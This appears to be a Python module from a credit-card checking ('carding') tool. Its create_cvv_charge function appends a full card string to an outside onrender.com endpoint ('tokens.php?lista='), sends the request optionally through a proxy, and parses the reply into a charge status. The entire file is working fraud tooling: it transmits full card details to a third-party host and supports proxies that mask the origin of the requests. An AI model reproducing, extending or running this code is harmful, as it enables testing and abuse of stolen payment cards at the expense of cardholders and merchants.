import httpx
from .response import clean_html_response

API_ENDPOINT = "https://b3-npnbit.onrender.com/tokens.php?lista="

async def create_cvv_charge(fullcc: str, session: httpx.AsyncClient, proxy: str = None) -> dict:
    url = API_ENDPOINT + fullcc
    try:
        client_args = {"timeout": 30, "follow_redirects": True}
        if proxy:
            client_args["proxies"] = {"http://": proxy, "https://": proxy}
        async with httpx.AsyncClient(**client_args) as client:
            resp = await client.get(url)
            raw_text = resp.text
            
            # Pass raw response to response.py for perfect handling
            status, response = clean_html_response(raw_text)
            return {"status": status, "response": response}
            
    except Exception as e:
        return {"status": "Error ⚠️", "response": str(e)}